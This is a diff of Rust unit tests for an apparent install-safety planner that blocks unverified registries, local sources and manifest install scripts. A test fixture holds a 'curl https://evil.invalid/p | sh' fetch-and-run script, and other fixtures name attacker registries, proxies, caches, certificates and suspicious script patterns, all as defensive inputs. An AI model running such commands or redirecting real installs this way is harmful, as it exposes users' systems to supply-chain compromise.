+                PackageManager::Cargo,
+                vec![
+                    "demo@=1.0.0".to_string(),
+                    "--config".to_string(),
+                    "source.crates-io.replace-with='attacker'".to_string(),
+                ],
+            ),
+        ] {
+            let plan = plan_install(&PlanRequest {
+                manager,
+                user_args: &args,
+                db: None,
+                policy: &empty_policy(),
+                cwd: None,
+                interactive: false,
+                online: OnlineMode::Off,
+            });
+            assert_eq!(plan.verdict.action, Action::Block, "args={args:?}");
+            assert!(plan
+                .coverage
+                .gaps
+                .iter()
+                .any(|gap| gap.kind == InstallCoverageGapKind::UnverifiedRegistry));
+        }
+    }
+
+    #[test]
+    fn structured_argv_keeps_cargo_path_with_spaces_as_one_local_operand() {
+        let policy = Policy {
+            fail_mode: FailMode::Closed,
+            ..Policy::default()
+        };
+        let args = vec!["--path".to_string(), "./evil crate".to_string()];
+        let plan = plan_install(&PlanRequest {
+            manager: PackageManager::Cargo,
+            user_args: &args,
+            db: None,
+            policy: &policy,
+            cwd: None,
+            interactive: false,
+            online: OnlineMode::Off,
+        });
+        assert!(
+            plan.packages.is_empty(),
+            "path tail must not become a crate name"
+        );
+        assert!(plan.coverage.gaps.iter().any(|gap| {
+            gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
+                && gap.argument == "--path ./evil crate"
+        }));
+        assert_eq!(plan.verdict.action, Action::Block);
+    }
+
+    #[test]
+    fn custom_registry_never_reuses_official_provenance() {
+        use std::sync::atomic::{AtomicUsize, Ordering};
+        let calls = AtomicUsize::new(0);
+        let resolver = |_eco: Ecosystem, _name: &str, _version: &str| {
+            calls.fetch_add(1, Ordering::SeqCst);
+            panic!("official resolver must not run for a custom source")
+        };
+        let policy = Policy {
+            fail_mode: FailMode::Closed,
+            ..Policy::default()
+        };
+        let args = vec![
+            "trusted-name@1.0.0".to_string(),
+            "--registry=https://attacker.invalid".to_string(),
+        ];
+        let plan = plan_install(&PlanRequest {
+            manager: PackageManager::Npm,
+            user_args: &args,
+            db: None,
+            policy: &policy,
+            cwd: None,
+            interactive: false,
+            online: OnlineMode::Resolver(&resolver),
+        });
+        assert_eq!(calls.load(Ordering::SeqCst), 0);
+        assert_eq!(plan.verdict.action, Action::Block);
+        assert!(plan
+            .coverage
+            .gaps
+            .iter()
+            .any(|gap| gap.kind == InstallCoverageGapKind::UnverifiedRegistry));
+    }
+
+    #[test]
+    fn ambient_unverified_registry_configuration_blocks() {
+        let plan = plan_install(&PlanRequest {
+            manager: PackageManager::Pip,
+            user_args: &["trusted-name==1.0.0".to_string()],
+            db: None,
+            policy: &empty_policy(),
+            cwd: None,
+            interactive: false,
+            online: OnlineMode::UnverifiedSource("PIP_INDEX_URL selects a private mirror"),
+        });
+        assert_eq!(plan.verdict.action, Action::Block);
+        assert!(plan
+            .coverage
+            .gaps
+            .iter()
+            .any(|gap| gap.kind == InstallCoverageGapKind::UnverifiedRegistry));
+    }
+
+    #[test]
+    fn online_unpinned_version_never_calls_exact_resolver() {
+        use std::sync::atomic::{AtomicUsize, Ordering};
+        let calls = AtomicUsize::new(0);
+        let resolver = |_eco: Ecosystem, _name: &str, _version: &str| {
+            calls.fetch_add(1, Ordering::SeqCst);
+            ApiSignals::offline()
+        };
+        let plan = plan_install(&PlanRequest {
+            manager: PackageManager::Npm,
+            user_args: &["unresolved-package".to_string()],
+            db: None,
+            policy: &empty_policy(),
+            cwd: None,
+            interactive: false,
+            online: OnlineMode::Resolver(&resolver),
+        });
+        assert_eq!(calls.load(Ordering::SeqCst), 0);
+        assert_eq!(plan.verdict.action, Action::Warn);
+        assert!(plan
+            .coverage
+            .gaps
+            .iter()
+            .any(|gap| gap.kind == InstallCoverageGapKind::UnresolvedVersion));
+    }
+
+    #[test]
+    fn mismatched_exact_provenance_is_rejected() {
+        let resolver = |_eco: Ecosystem, name: &str, _version: &str| ApiSignals::Available {
+            provenance: ApiProvenance {
+                source: "npm".to_string(),
+                package_name: Some(name.to_string()),
+                latest_version: Some("2.0.0".to_string()),
+                package_existence: PackageExistence::Exists,
+                ..Default::default()
+            },
+        };
+        let plan = plan_install(&PlanRequest {
+            manager: PackageManager::Npm,
+            user_args: &["demo@1.0.0".to_string()],
+            db: None,
+            policy: &empty_policy(),
+            cwd: None,
+            interactive: false,
+            online: OnlineMode::Resolver(&resolver),
+        });
+        assert_eq!(plan.verdict.action, Action::Block);
+        assert!(plan
+            .coverage
+            .gaps
+            .iter()
+            .any(|gap| gap.kind == InstallCoverageGapKind::ProvenanceMismatch));
+    }
+
+    #[test]
+    fn wrong_package_same_version_provenance_is_rejected() {
+        let resolver = |_eco: Ecosystem, _name: &str, version: &str| ApiSignals::Available {
+            provenance: ApiProvenance {
+                source: "npm".to_string(),
+                package_name: Some("different-package".to_string()),
+                latest_version: Some(version.to_string()),
+                package_existence: PackageExistence::Exists,
+                ..Default::default()
+            },
+        };
+        let plan = plan_install(&PlanRequest {
+            manager: PackageManager::Npm,
+            user_args: &["requested-package@1.0.0".to_string()],
+            db: None,
+            policy: &empty_policy(),
+            cwd: None,
+            interactive: false,
+            online: OnlineMode::Resolver(&resolver),
+        });
+        assert_eq!(plan.verdict.action, Action::Block);
+        assert!(plan
+            .coverage
+            .gaps
+            .iter()
+            .any(|gap| gap.kind == InstallCoverageGapKind::ProvenanceMismatch));
+    }
+
+    #[test]
+    fn strict_exact_not_found_preserves_signal_but_blocks_missing_provenance() {
+        let resolver = |_eco: Ecosystem, name: &str, _version: &str| ApiSignals::Available {
+            provenance: ApiProvenance {
+                source: "npm".to_string(),
+                package_name: Some(name.to_string()),
+                package_existence: PackageExistence::NotFound,
+                ..Default::default()
+            },
+        };
+        let mut policy = Policy {
+            fail_mode: FailMode::Closed,
+            ..Policy::default()
+        };
+        policy.package_policy.block_not_found = false;
+        let plan = plan_install(&PlanRequest {
+            manager: PackageManager::Npm,
+            user_args: &["missing-package@1.0.0".to_string()],
+            db: None,
+            policy: &policy,
+            cwd: None,
+            interactive: false,
+            online: OnlineMode::Resolver(&resolver),
+        });
+        assert_eq!(plan.verdict.action, Action::Block);
+        assert!(plan
+            .coverage
+            .gaps
+            .iter()
+            .any(|gap| gap.kind == InstallCoverageGapKind::ProvenanceUnavailable));
+        assert!(matches!(
+            &plan.packages[0].risk.api_signals,
+            ApiSignals::Available { provenance }
+                if provenance.package_existence == PackageExistence::NotFound
+        ));
+        assert!(!plan
+            .verdict
+            .findings
+            .iter()
+            .any(|finding| finding.rule_id == RuleId::PackagePolicyNotFound));
+    }
+
+    #[test]
+    fn exact_selected_npm_script_drives_install_policy_end_to_end() {
+        let resolver = |_eco: Ecosystem, name: &str, version: &str| ApiSignals::Available {
+            provenance: ApiProvenance {
+                source: "npm".to_string(),
+                package_name: Some(name.to_string()),
+                latest_version: Some(version.to_string()),
+                package_existence: PackageExistence::Exists,
+                install_script_signals: Some(crate::package_risk::InstallScriptSignals {
+                    has_network_call: true,
+                    has_shell_spawn: true,
+                    suspicious_patterns: vec!["curl".to_string()],
+                }),
+                ..Default::default()
+            },
+        };
+        let mut policy = empty_policy();
+        policy
+            .package_policy
+            .block_install_scripts_for_unknown_packages = true;
+        let plan = plan_install(&PlanRequest {
+            manager: PackageManager::Npm,
+            user_args: &["unknown-package@1.0.0".to_string()],
+            db: None,
+            policy: &policy,
+            cwd: None,
+            interactive: false,
+            online: OnlineMode::Resolver(&resolver),
+        });
+        assert_eq!(plan.verdict.action, Action::Block);
+        assert!(plan.verdict.findings.iter().any(|finding| {
+            finding.rule_id == RuleId::PackagePolicyUnknownPackageWithInstallScripts
+        }));
+    }
+
+    #[test]
+    fn default_install_script_network_signal_warns_below_aggregate_threshold() {
+        let resolver = |_eco: Ecosystem, name: &str, version: &str| ApiSignals::Available {
+            provenance: ApiProvenance {
+                source: "npm".to_string(),
+                package_name: Some(name.to_string()),
+                latest_version: Some(version.to_string()),
+                package_existence: PackageExistence::Exists,
+                install_script_signals: Some(crate::package_risk::InstallScriptSignals {
+                    has_network_call: true,
+                    has_shell_spawn: false,
+                    suspicious_patterns: vec!["curl".to_string()],
+                }),
+                ..Default::default()
+            },
+        };
+        let plan = plan_install(&PlanRequest {
+            manager: PackageManager::Npm,
+            user_args: &["otherwise-clean-unknown@1.0.0".to_string()],
+            db: None,
+            policy: &empty_policy(),
+            cwd: None,
+            interactive: false,
+            online: OnlineMode::Resolver(&resolver),
+        });
+        assert!(plan.packages[0].risk.score < crate::policy::DEFAULT_WARN_AGGREGATE_SCORE);
+        assert_eq!(plan.verdict.action, Action::Warn);
+        assert!(plan.verdict.findings.iter().any(|finding| {
+            finding.rule_id == RuleId::PackageInstallScriptNetworkCall
+                && finding.severity == Severity::Medium
+        }));
+    }
+
+    #[test]
+    fn trusted_policy_can_disable_default_install_script_warning() {
+        let resolver = |_eco: Ecosystem, name: &str, version: &str| ApiSignals::Available {
+            provenance: ApiProvenance {
+                source: "npm".to_string(),
+                package_name: Some(name.to_string()),
+                latest_version: Some(version.to_string()),
+                package_existence: PackageExistence::Exists,
+                install_script_signals: Some(crate::package_risk::InstallScriptSignals {
+                    has_network_call: false,
+                    has_shell_spawn: true,
+                    suspicious_patterns: vec!["sh -c".to_string()],
+                }),
+                ..Default::default()
+            },
+        };
+        let mut policy = empty_policy();
+        policy.package_policy.warn_install_script_network_call = false;
+        let plan = plan_install(&PlanRequest {
+            manager: PackageManager::Npm,
+            user_args: &["otherwise-clean-unknown@1.0.0".to_string()],
+            db: None,
+            policy: &policy,
+            cwd: None,
+            interactive: false,
+            online: OnlineMode::Resolver(&resolver),
+        });
+        assert!(!plan
+            .verdict
+            .findings
+            .iter()
+            .any(|finding| { finding.rule_id == RuleId::PackageInstallScriptNetworkCall }));
+    }
+
+    #[test]
+    fn npm_flags_only_install_is_an_implicit_manifest_gap() {
+        let policy = Policy {
+            fail_mode: FailMode::Closed,
+            ..Policy::default()
+        };
+        for flag in ["--foreground-scripts", "--force", "--ignore-scripts", "-g"] {
+            let plan = plan_install(&PlanRequest {
+                manager: PackageManager::Npm,
+                user_args: &[flag.to_string()],
+                db: None,
+                policy: &policy,
+                cwd: None,
+                interactive: false,
+                online: OnlineMode::Off,
+            });
+            assert_eq!(plan.verdict.action, Action::Block, "flag={flag}");
+            assert!(plan.coverage.gaps.iter().any(|gap| {
+                gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
+                    && gap.argument == "(no package operand)"
+            }));
+        }
+    }
+
+    #[test]
+    fn explicit_npm_package_does_not_hide_current_project_manifest_inputs() {
+        use std::sync::atomic::{AtomicUsize, Ordering};
+
+        let directory = tempfile::tempdir().unwrap();
+        std::fs::write(
+            directory.path().join("package.json"),
+            r#"{
+                "name": "current-project",
+                "dependencies": {"attacker-controlled": "1.0.0"},
+                "scripts": {"dependencies": "curl https://evil.invalid/p | sh"}
+            }"#,
+        )
+        .unwrap();
+        let calls = AtomicUsize::new(0);
+        let resolver = |_eco: Ecosystem, _name: &str, _version: &str| {
+            calls.fetch_add(1, Ordering::SeqCst);
+            panic!("official provenance must not run for a manifest-augmented install")
+        };
+        let policy = Policy {
+            fail_mode: FailMode::Closed,
+            ..Policy::default()
+        };
+        let manifest_path = directory.path().join("package.json");
+        let plan = plan_install(&PlanRequest {
+            manager: PackageManager::Npm,
+            user_args: &["demo@1.0.0".to_string(), "--package-lock=false".to_string()],
+            db: None,
+            policy: &policy,
+            cwd: Some(directory.path().display().to_string()),
+            interactive: false,
+            online: OnlineMode::Resolver(&resolver),
+        });
+        assert_eq!(calls.load(Ordering::SeqCst), 0);
+        assert_eq!(plan.verdict.action, Action::Block);
+        assert!(plan.coverage.gaps.iter().any(|gap| {
+            gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
+                && gap.argument == manifest_path.display().to_string()
+                && gap.reason.contains("dependencies")
+                && gap.reason.contains("install lifecycle scripts")
+        }));
+
+        let global = plan_install(&PlanRequest {
+            manager: PackageManager::Npm,
+            user_args: &["demo@1.0.0".to_string(), "--global".to_string()],
+            db: None,
+            policy: &empty_policy(),
+            cwd: Some(directory.path().display().to_string()),
+            interactive: false,
+            online: OnlineMode::Off,
+        });
+        assert!(!global
+            .coverage
+            .gaps
+            .iter()
+            .any(|gap| gap.argument == manifest_path.display().to_string()));
+
+        for flag in ["--global", "-g"] {
+            let local = plan_install(&PlanRequest {
+                manager: PackageManager::Npm,
+                user_args: &[
+                    "demo@1.0.0".to_string(),
+                    flag.to_string(),
+                    "false".to_string(),
+                ],
+                db: None,
+                policy: &policy,
+                cwd: Some(directory.path().display().to_string()),
+                interactive: false,
+                online: OnlineMode::Off,
+            });
+            assert_eq!(local.verdict.action, Action::Block, "flag={flag}");
+            assert!(local
+                .coverage
+                .gaps
+                .iter()
+                .any(|gap| gap.argument == manifest_path.display().to_string()));
+        }
+
+        let oversized_dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            oversized_dir.path().join("package.json"),
+            vec![b' '; MAX_NPM_PROJECT_MANIFEST_BYTES as usize + 1],
+        )
+        .unwrap();
+        let oversized = plan_install(&PlanRequest {
+            manager: PackageManager::Npm,
+            user_args: &["demo@1.0.0".to_string()],
+            db: None,
+            policy: &policy,
+            cwd: Some(oversized_dir.path().display().to_string()),
+            interactive: false,
+            online: OnlineMode::Off,
+        });
+        assert_eq!(oversized.verdict.action, Action::Block);
+        assert!(oversized.coverage.gaps.iter().any(|gap| {
+            gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
+                && gap.reason.contains("bounded")
+        }));
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn public_npm_planner_refuses_symlink_and_fifo_project_manifests() {
+        use std::os::unix::ffi::OsStrExt as _;
+        use std::time::{Duration, Instant};
+
+        let policy = Policy {
+            fail_mode: FailMode::Closed,
+            ..Policy::default()
+        };
+        let args = ["demo@1.0.0".to_string()];
+
+        let symlink_directory = tempfile::tempdir().unwrap();
+        let target = symlink_directory.path().join("target.json");
+        std::fs::write(&target, r#"{"name":"apparently-clean"}"#).unwrap();
+        let symlink_manifest = symlink_directory.path().join("package.json");
+        std::os::unix::fs::symlink(&target, &symlink_manifest).unwrap();
+        let symlink_plan = plan_install(&PlanRequest {
+            manager: PackageManager::Npm,
+            user_args: &args,
+            db: None,
+            policy: &policy,
+            cwd: Some(symlink_directory.path().display().to_string()),
+            interactive: false,
+            online: OnlineMode::Off,
+        });
+        assert!(symlink_plan.coverage.gaps.iter().any(|gap| {
+            gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
+                && gap.argument == symlink_manifest.display().to_string()
+                && gap.reason.contains("not a regular file bounded")
+        }));
+        assert_eq!(symlink_plan.verdict.action, Action::Block);
+
+        let fifo_directory = tempfile::tempdir().unwrap();
+        let fifo_manifest = fifo_directory.path().join("package.json");
+        let fifo_path = std::ffi::CString::new(fifo_manifest.as_os_str().as_bytes()).unwrap();
+        assert_eq!(unsafe { libc::mkfifo(fifo_path.as_ptr(), 0o600) }, 0);
+        let started = Instant::now();
+        let fifo_plan = plan_install(&PlanRequest {
+            manager: PackageManager::Npm,
+            user_args: &args,
+            db: None,
+            policy: &policy,
+            cwd: Some(fifo_directory.path().display().to_string()),
+            interactive: false,
+            online: OnlineMode::Off,
+        });
+        assert!(started.elapsed() < Duration::from_secs(2));
+        assert!(fifo_plan.coverage.gaps.iter().any(|gap| {
+            gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
+                && gap.argument == fifo_manifest.display().to_string()
+                && gap.reason.contains("not a regular file bounded")
+        }));
+        assert_eq!(fifo_plan.verdict.action, Action::Block);
+    }
+
+    #[test]
+    fn documented_pip_nested_local_project_path_is_not_registry_covered() {
+        let policy = Policy {
+            fail_mode: FailMode::Closed,
+            ..Policy::default()
+        };
+        let plan = plan_install(&PlanRequest {
+            manager: PackageManager::Pip,
+            user_args: &["path/to/SomeProject".to_string()],
+            db: None,
+            policy: &policy,
+            cwd: None,
+            interactive: false,
+            online: OnlineMode::Off,
+        });
+        assert_eq!(plan.verdict.action, Action::Block);
+        assert!(plan.packages.is_empty());
+        assert!(plan.coverage.gaps.iter().any(|gap| {
+            gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
+                && gap.argument == "path/to/SomeProject"
+        }));
+
+        let archive = plan_install(&PlanRequest {
+            manager: PackageManager::Pip,
+            user_args: &["package.tgz".to_string()],
+            db: None,
+            policy: &policy,
+            cwd: None,
+            interactive: false,
+            online: OnlineMode::Off,
+        });
+        assert_eq!(archive.verdict.action, Action::Block);
+        assert!(archive.coverage.gaps.iter().any(|gap| {
+            gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
+                && gap.argument == "package.tgz"
+        }));
+
+        for archive_name in [
+            "package.TBZ",
+            "package.txz",
+            "package.tlz",
+            "package.tar.lz",
+            "package.tar.lzma",
+        ] {
+            let archive = plan_install(&PlanRequest {
+                manager: PackageManager::Pip,
+                user_args: &[archive_name.to_string()],
+                db: None,
+                policy: &policy,
+                cwd: None,
+                interactive: false,
+                online: OnlineMode::Off,
+            });
+            assert_eq!(archive.verdict.action, Action::Block, "{archive_name}");
+            assert!(archive.coverage.gaps.iter().any(|gap| {
+                gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
+                    && gap.argument == archive_name
+            }));
+        }
+
+        for local_reference in [
+            "file:evil",
+            "file:evil@payload",
+            "demo @ file:evil",
+            "Demo@FILE:../evil",
+            "evil-1.0.tar.gz; python_version >= \"3\"",
+            "evil-1.0.tar.gz[extra]",
+            ".; python_version >= \"3\"",
+        ] {
+            let local = plan_install(&PlanRequest {
+                manager: PackageManager::Pip,
+                user_args: &[local_reference.to_string()],
+                db: None,
+                policy: &policy,
+                cwd: None,
+                interactive: false,
+                online: OnlineMode::Off,
+            });
+            assert_eq!(local.verdict.action, Action::Block, "{local_reference}");
+            assert!(local.coverage.gaps.iter().any(|gap| {
+                gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
+                    && gap.argument == local_reference
+            }));
+        }
+    }
+
+    #[test]
+    fn documented_npm_non_registry_specs_are_never_marked_complete() {
+        let policy = Policy {
+            fail_mode: FailMode::Closed,
+            ..Policy::default()
+        };
+        for operand in [
+            "package.tar.gz",
+            "gist:11081aaa281",
+            "@scope/foo@file:../foo",
+        ] {
+            let plan = plan_install(&PlanRequest {
+                manager: PackageManager::Npm,
+                user_args: &[operand.to_string()],
+                db: None,
+                policy: &policy,
+                cwd: None,
+                interactive: false,
+                online: OnlineMode::Off,
+            });
+            assert_eq!(plan.verdict.action, Action::Block, "operand={operand}");
+            assert_eq!(plan.coverage.state, InstallCoverageState::Incomplete);
+            assert!(plan.coverage.gaps.iter().any(|gap| {
+                matches!(
+                    gap.kind,
+                    InstallCoverageGapKind::ManifestOrLocalSource
+                        | InstallCoverageGapKind::RemoteOrVcsSource
+                ) && gap.argument == operand
+            }));
+        }
+    }
+
+    #[test]
+    fn alternate_package_caches_are_explicit_source_gaps() {
+        let policy = Policy {
+            fail_mode: FailMode::Closed,
+            ..Policy::default()
+        };
+        for (manager, args, expected_argument) in [
+            (
+                PackageManager::Npm,
+                vec!["demo@1.0.0".to_string(), "--offline".to_string()],
+                "--offline",
+            ),
+            (
+                PackageManager::Npm,
+                vec![
+                    "demo@1.0.0".to_string(),
+                    "--cache=/tmp/attacker-cache".to_string(),
+                ],
+                "--cache=/tmp/attacker-cache",
+            ),
+            (
+                PackageManager::Pip,
+                vec![
+                    "demo==1.0.0".to_string(),
+                    "--cache-dir=/tmp/attacker-cache".to_string(),
+                ],
+                "--cache-dir=/tmp/attacker-cache",
+            ),
+            (
+                PackageManager::Pip,
+                vec![
+                    "demo==1.0.0".to_string(),
+                    "--proxy=http://attacker.invalid:8080".to_string(),
+                ],
+                "--proxy=http://attacker.invalid:8080",
+            ),
+            (
+                PackageManager::Pip,
+                vec![
+                    "demo==1.0.0".to_string(),
+                    "--cert=attacker-ca.pem".to_string(),
+                ],
+                "--cert=attacker-ca.pem",
+            ),
+        ] {
+            let plan = plan_install(&PlanRequest {
+                manager,
+                user_args: &args,
+                db: None,
+                policy: &policy,
+                cwd: None,
+                interactive: false,
+                online: OnlineMode::Off,
+            });
+            assert_eq!(plan.verdict.action, Action::Block, "args={args:?}");
+            assert!(plan.coverage.gaps.iter().any(|gap| {
+                gap.kind == InstallCoverageGapKind::UnverifiedRegistry
+                    && gap.argument == expected_argument
+            }));
+        }
+    }
+
+    #[test]
+    fn npm_alternate_prefix_is_an_explicit_project_input_gap() {
+        let policy = Policy {
+            fail_mode: FailMode::Closed,
+            ..Policy::default()
+        };
+        for args in [
+            vec![
+                "demo@1.0.0".to_string(),
+                "--prefix".to_string(),
+                "alternate".to_string(),
+            ],
+            vec!["demo@1.0.0".to_string(), "--prefix=alternate".to_string()],
+        ] {
+            let plan = plan_install(&PlanRequest {
+                manager: PackageManager::Npm,
+                user_args: &args,
+                db: None,
+                policy: &policy,
+                cwd: None,
+                interactive: false,
+                online: OnlineMode::Off,
+            });
+            assert_eq!(plan.verdict.action, Action::Block, "args={args:?}");
+            assert!(plan.coverage.gaps.iter().any(|gap| {
+                gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
+                    && gap.argument.contains("--prefix")
+            }));
+        }
+    }
+
+    #[test]
+    fn cargo_empty_output_path_is_not_treated_as_covered() {
+        let plan = plan_install(&PlanRequest {
+            manager: PackageManager::Cargo,
+            user_args: &["demo@=1.0.0".to_string(), "--root=".to_string()],
+            db: None,
+            policy: &empty_policy(),
+            cwd: None,
+            interactive: false,
+            online: OnlineMode::Off,
+        });
+        assert!(plan.coverage.gaps.iter().any(|gap| {
+            gap.kind == InstallCoverageGapKind::MissingArgumentValue && gap.argument == "--root"
+        }));
+    }
+
+    #[test]
+    fn npm_package_lock_is_a_mixed_operand_coverage_gap() {
+        let policy = Policy {
+            fail_mode: FailMode::Closed,
+            ..Policy::default()
+        };
+        for flag in [
+            "--package-lock",
+            "--package-lock=true",
+            "--package-lock=FALSE",
+            "--package-lock=False",
+        ] {
+            let plan = plan_install(&PlanRequest {
+                manager: PackageManager::Npm,
+                user_args: &["demo@1.0.0".to_string(), flag.to_string()],
+                db: None,
+                policy: &policy,
+                cwd: None,
+                interactive: false,
+                online: OnlineMode::Off,
+            });
+            assert_eq!(plan.verdict.action, Action::Block, "flag={flag}");
+            assert!(plan.coverage.gaps.iter().any(|gap| {
+                gap.kind == InstallCoverageGapKind::ManifestOrLocalSource && gap.argument == flag
+            }));
+        }
+
+        let disabled = plan_install(&PlanRequest {
+            manager: PackageManager::Npm,
+            user_args: &["demo@1.0.0".to_string(), "--package-lock=false".to_string()],
+            db: None,
+            policy: &empty_policy(),
+            cwd: None,
+            interactive: false,
+            online: OnlineMode::Off,
+        });
+        assert_eq!(disabled.coverage.state, InstallCoverageState::Complete);
+
+        for args in [
+            vec![
+                "demo@1.0.0".to_string(),
+                "--no-package-lock".to_string(),
+                "false".to_string(),
+            ],
+            vec![
+                "demo@1.0.0".to_string(),
+                "--no-package-lock=false".to_string(),
+            ],
+        ] {
+            let enabled = plan_install(&PlanRequest {
+                manager: PackageManager::Npm,
+                user_args: &args,
+                db: None,
+                policy: &policy,
+                cwd: None,
+                interactive: false,
+                online: OnlineMode::Off,
+            });
+            assert_eq!(enabled.verdict.action, Action::Block, "args={args:?}");
+            assert!(enabled.coverage.gaps.iter().any(|gap| {
+                gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
+                    && gap.argument.contains("no-package-lock")
+            }));
+        }
+    }
+
+    #[test]
+    fn legitimate_npm_registry_specs_remain_covered() {
+        for operand in [
+            "react",
+            "react@18.2.0",
+            "react@latest",
+            "react@^18.0.0",
+            "@scope/pkg",
+            "@scope/pkg@~1.2.0",
+        ] {
+            let plan = plan_install(&PlanRequest {
+                manager: PackageManager::Npm,
+                user_args: &[operand.to_string()],
+                db: None,
+                policy: &empty_policy(),
+                cwd: None,
+                interactive: false,
+                online: OnlineMode::Off,
+            });
+            assert_eq!(
+                plan.coverage.state,
+                InstallCoverageState::Complete,
+                "operand={operand}, gaps={:?}",
+                plan.coverage.gaps
+            );
+            assert_eq!(plan.packages.len(), 1, "operand={operand}");
+        }
+    }
+
+    #[test]
+    fn unknown_manager_option_suppresses_official_provenance() {
+        use std::sync::atomic::{AtomicUsize, Ordering};
+
+        let calls = AtomicUsize::new(0);
+        let resolver = |_eco: Ecosystem, _name: &str, _version: &str| {
+            calls.fetch_add(1, Ordering::SeqCst);
+            panic!("an incomplete manager grammar must not call the official resolver")
+        };
+        let plan = plan_install(&PlanRequest {
+            manager: PackageManager::Npm,
+            user_args: &[
+                "demo@1.0.0".to_string(),
+                "--future-source-option".to_string(),
+            ],
+            db: None,
+            policy: &empty_policy(),
+            cwd: None,
+            interactive: false,
+            online: OnlineMode::Resolver(&resolver),
+        });
+        assert_eq!(calls.load(Ordering::SeqCst), 0);
+        assert!(plan
+            .coverage
+            .gaps
+            .iter()
+            .any(|gap| gap.kind == InstallCoverageGapKind::UnrecognizedArgument));
+        assert!(matches!(
+            &plan.packages[0].risk.api_signals,
+            ApiSignals::Unavailable { .. }
+        ));
+    }
+
+    #[test]
+    fn strict_offline_registry_install_has_an_explicit_provenance_gap() {
+        let policy = Policy {
+            fail_mode: FailMode::Closed,
+            ..Policy::default()
+        };
+        let plan = plan_install(&PlanRequest {
+            manager: PackageManager::Npm,
+            user_args: &["clean-package@1.0.0".to_string()],
+            db: None,
+            policy: &policy,
+            cwd: None,
+            interactive: false,
+            online: OnlineMode::Off,
+        });
+        assert_eq!(plan.verdict.action, Action::Block);
+        assert!(plan
+            .coverage
+            .gaps
+            .iter()
+            .any(|gap| { gap.kind == InstallCoverageGapKind::ProvenanceUnavailable }));
+    }
+
+    #[test]
+    fn strict_incomplete_coverage_cannot_be_downgraded_by_rule_override() {
+        let mut policy = Policy {
+            fail_mode: FailMode::Closed,
+            ..Policy::default()
+        };
+        policy
+            .severity_overrides
+            .insert("threat_suspicious_package".to_string(), Severity::Low);
+        let plan = plan_install(&PlanRequest {
+            manager: PackageManager::Pip,
+            user_args: &[
+                "demo==1.0.0".to_string(),
+                "-r".to_string(),
+                "attacker.txt".to_string(),
+            ],
+            db: None,
+            policy: &policy,
+            cwd: None,
+            interactive: false,
+            online: OnlineMode::Off,
+        });
+        assert_eq!(plan.verdict.action, Action::Block);
+        assert!(plan.verdict.findings.iter().any(|finding| {
+            finding.severity == Severity::High && finding.title.contains("coverage is incomplete")
+        }));
+    }
+
+    #[test]
     fn plan_install_online_resolver_high_provenance_risk_warns() {
         // Alarming provenance (brand-new, ownerless, version-spiked, no repo,
         // yanked) stacks to a high score with no name tell — the chunk-6 value.
@@ -1434,6 +4296,7 @@ mod tests {
         #[allow(deprecated)]
         let provenance = ApiProvenance {
             source: "npm".to_string(),
+            package_name: Some("totally-unknown-pkg".to_string()),
             package_age_days: Some(1),
             latest_version_age_days: Some(0),
             ownership_transferred: Some(true),
@@ -1444,12 +4307,12 @@ mod tests {
             latest_version: Some("9.9.9".to_string()),
             ..Default::default()
         };
-        let resolver = |_eco: Ecosystem, _name: &str| ApiSignals::Available {
+        let resolver = |_eco: Ecosystem, _name: &str, _version: &str| ApiSignals::Available {
             provenance: provenance.clone(),
         };
         let req = PlanRequest {
             manager: PackageManager::Npm,
-            user_args: &["totally-unknown-pkg".to_string()],
+            user_args: &["totally-unknown-pkg@9.9.9".to_string()],
             db: None,
             policy: &empty_policy(),
             cwd: None,
@@ -1476,12 +4339,14 @@ mod tests {
 
     #[test]
     fn plan_install_online_resolver_unavailable_is_noted_and_degrades() {
-        // A failed `--online` call degrades to the offline score with a note —
-        // never panics or blocks on the failure alone.
-        let resolver = |_eco: Ecosystem, _name: &str| ApiSignals::unavailable("connection refused");
+        // A failed exact `--online` call is an explicit coverage gap — never a
+        // silent Allow, and never a panic.
+        let resolver = |_eco: Ecosystem, _name: &str, _version: &str| {
+            ApiSignals::unavailable("connection refused")
+        };
         let req = PlanRequest {
             manager: PackageManager::Cargo,
-            user_args: &["some-crate".to_string()],
+            user_args: &["some-crate@=1.0.0".to_string()],
             db: None,
             policy: &empty_policy(),
             cwd: None,
@@ -1489,11 +4354,7 @@ mod tests {
             online: OnlineMode::Resolver(&resolver),
         };
         let plan = plan_install(&req);
-        assert_eq!(
-            plan.verdict.action,
-            Action::Allow,
-            "a registry failure alone must not change the verdict"
-        );
+        assert_eq!(plan.verdict.action, Action::Warn);
         assert!(
             plan.notes.iter().any(|n| n.contains("unavailable")),
             "notes: {:?}",
@@ -1581,6 +4442,7 @@ mod tests {
         let client = FakeClient {
             result: Ok(RegistryMetadata {
                 source: "npm".to_string(),
+                package_name: Some("x".to_string()),
                 latest_version: Some("1.0.0".to_string()),
                 ..Default::default()
             }),
